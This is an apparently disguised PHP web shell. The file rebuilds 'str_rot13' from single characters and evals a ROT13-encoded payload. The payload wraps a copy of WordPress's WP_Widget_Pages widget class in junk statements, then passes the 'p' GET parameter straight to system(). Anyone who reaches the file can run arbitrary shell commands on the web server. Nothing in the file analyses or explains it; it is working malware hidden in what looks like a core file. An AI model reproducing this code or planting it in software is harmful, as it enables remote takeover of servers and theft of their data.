<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Cntrf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Cntrf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Cntrf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Cntrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_cntrf',
			'qrfpevcgvba'                 => __( 'N yvfg bs lbhe fvgr&#8217;f Cntrf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'cntrf', __( 'Cntrf' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Cntrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Cntrf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$qrsnhyg_gvgyr = __( 'Cntrf' );
		$gvgyr         = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/**
		 * Svygref gur jvqtrg gvgyr.
		 *
		 * @fvapr 2.6.0
		 *
		 * @cnenz fgevat $gvgyr    Gur jvqtrg gvgyr. Qrsnhyg 'Cntrf'.
		 * @cnenz neenl  $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
		 * @cnenz zvkrq  $vq_onfr  Gur jvqtrg VQ.
		 */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$fbegol  = rzcgl( $vafgnapr['fbegol'] ) ? 'zrah_beqre' : $vafgnapr['fbegol'];
		$rkpyhqr = rzcgl( $vafgnapr['rkpyhqr'] ) ? '' : $vafgnapr['rkpyhqr'];

		vs ( 'zrah_beqre' === $fbegol ) {
			$fbegol = 'zrah_beqre, cbfg_gvgyr';
		}

		$bhgchg = jc_yvfg_cntrf(
			/**
			 * Svygref gur nethzragf sbe gur Cntrf jvqtrg.
			 *
			 * @fvapr 2.8.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr jc_yvfg_cntrf()
			 *
			 * @cnenz neenl $netf     Na neenl bs nethzragf gb ergevrir gur cntrf yvfg.
			 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			nccyl_svygref(
				'jvqtrg_cntrf_netf',
				neenl(
					'gvgyr_yv'    => '',
					'rpub'        => 0,
					'fbeg_pbyhza' => $fbegol,
					'rkpyhqr'     => $rkpyhqr,
				),
				$vafgnapr
			)
		);

		vs ( ! rzcgl( $bhgchg ) ) {
			rpub $netf['orsber_jvqtrg'];
			vs ( $gvgyr ) {
				rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
			}

			$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
			$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

			vs ( 'ugzy5' === $sbezng ) {
				// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
				$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
				$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
				rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
			}
			?>

			<hy>
				<?cuc rpub $bhgchg; ?>
			</hy>

			<?cuc
			vs ( 'ugzy5' === $sbezng ) {
				rpub '</ani>';
			}

			rpub $netf['nsgre_jvqtrg'];
		}
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Cntrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr          = $byq_vafgnapr;
		$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		vs ( va_neenl( $arj_vafgnapr['fbegol'], neenl( 'cbfg_gvgyr', 'zrah_beqre', 'VQ' ), gehr ) ) {
			$vafgnapr['fbegol'] = $arj_vafgnapr['fbegol'];
		} ryfr {
			$vafgnapr['fbegol'] = 'zrah_beqre';
		}

		$vafgnapr['rkpyhqr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['rkpyhqr'] );

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Cntrf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		// Qrsnhygf.
		$vafgnapr = jc_cnefr_netf(
			(neenl) $vafgnapr,
			neenl(
				'fbegol'  => 'cbfg_gvgyr',
				'gvgyr'   => '',
				'rkpyhqr' => '',
			)
		);
		?>
		<c>
			<ynory sbe=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'gvgyr' ) ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'gvgyr' ) ); ?>\" anzr=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_anzr( 'gvgyr' ) ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		</c>

		<c>
			<ynory sbe=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'fbegol' ) ); ?>\"><?cuc _r( 'Fbeg ol:' ); ?></ynory>
			<fryrpg anzr=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_anzr( 'fbegol' ) ); ?>\" vq=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'fbegol' ) ); ?>\" pynff=\"jvqrsng\">
				<bcgvba inyhr=\"cbfg_gvgyr\"<?cuc fryrpgrq( $vafgnapr['fbegol'], 'cbfg_gvgyr' ); ?>><?cuc _r( 'Cntr gvgyr' ); ?></bcgvba>
				<bcgvba inyhr=\"zrah_beqre\"<?cuc fryrpgrq( $vafgnapr['fbegol'], 'zrah_beqre' ); ?>><?cuc _r( 'Cntr beqre' ); ?></bcgvba>
				<bcgvba inyhr=\"VQ\"<?cuc fryrpgrq( $vafgnapr['fbegol'], 'VQ' ); ?>><?cuc _r( 'Cntr VQ' ); ?></bcgvba>
			</fryrpg>
		</c>

		<c>
			<ynory sbe=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'rkpyhqr' ) ); ?>\"><?cuc _r( 'Rkpyhqr:' ); ?></ynory>
			<vachg glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['rkpyhqr'] ); ?>\" anzr=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_anzr( 'rkpyhqr' ) ); ?>\" vq=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( 'rkpyhqr' ) ); ?>\" pynff=\"jvqrsng\" />
			<oe />
			<fznyy><?cuc _r( 'Cntr VQf, frcnengrq ol pbzznf.' ); ?></fznyy>
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>